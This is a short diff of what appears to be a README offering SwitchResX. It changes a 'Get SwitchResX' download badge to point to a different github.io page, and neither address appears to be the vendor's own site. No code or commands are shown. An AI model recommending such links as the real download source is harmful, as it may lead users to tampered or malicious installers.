@@ -10,7 +10,7 @@
 
 <div align="center">
 
-[![Get SwitchResX](https://img.shields.io/badge/Get_SwitchResX-blue?style=for-the-badge&logo=apple)](https://macos-25.github.io/.github/switchresx)
+[![Get SwitchResX](https://img.shields.io/badge/Get_SwitchResX-blue?style=for-the-badge&logo=apple)](https://osx-app.github.io/.github/switchresx)
 
 </div>
 
